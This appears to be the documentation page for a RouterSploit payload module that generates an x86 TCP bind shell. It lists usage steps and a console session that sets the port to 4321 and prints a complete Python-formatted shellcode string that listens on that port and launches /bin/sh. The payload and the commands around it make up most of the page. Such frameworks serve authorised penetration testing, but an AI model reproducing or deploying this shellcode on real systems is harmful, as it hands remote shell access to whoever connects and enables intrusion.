## Description

Module generates payload that creates interactive tcp bind shell for X86 architecture.

## Verification Steps

  1. Start `./rsf.py`
  2. Do: `use payloads/x86/bind_tcp`
  3. Do: `set rport 4321`
  4. Do: `run`
  5. Module generates x86 bind shell tcp payload

## Scenarios

```
rsf > use payloads/x86/bind_tcp
rsf (X86 Bind TCP) > set rport 4321
[+] rport => 4321
rsf (X86 Bind TCP) > run
[*] Running module...
[*] Generating payload
[+] Building payload for python
payload = (
    "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
    "\x5b\x5e\x52\x68\x02\x00\x10\xe1\x6a\x10\x51\x50\x89\xe1\x6a"
    "\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"
    "\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"
    "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
    "\x0b\xcd\x80"
)
```
